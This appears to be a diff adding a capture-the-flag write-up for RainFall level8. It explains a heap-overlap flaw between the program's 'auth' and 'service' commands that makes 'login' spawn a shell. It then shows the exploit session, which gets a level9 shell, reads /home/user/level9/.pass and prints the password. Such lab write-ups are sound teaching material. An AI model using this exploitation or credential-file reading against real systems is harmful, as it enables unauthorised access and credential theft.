@@ -179,3 +179,38 @@ Dump of assembler code for function main:
    0x08048738 <+468>:   ret
 ```
 
+its an infinite loop calling printf and fgets of size 128 into buffer
+
+if the buffer match 
+"auth "
+"service"
+"reset"
+"login"
+
+if will do the following
+
+auth: call malloc(4) then if buffer if buffer - 5 len is less than or equal to 30. It will strcpy into auth
+
+reset: call free on auth malloc
+
+service: strdup buffer + 7
+
+login: call sh if auth + 32 is not empty else fwrite Password:
+
+since auth only malloc 4 byte if it we were to call service after auth with more buffer more than 32 
+it will set the auth + 32 to the buffer from fget.
+
+```sh
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
+auth 
+0x804a008, (nil) 
+serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+0x804a008, 0x804a018 
+login
+$ whoami
+level9
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+$ 
+```
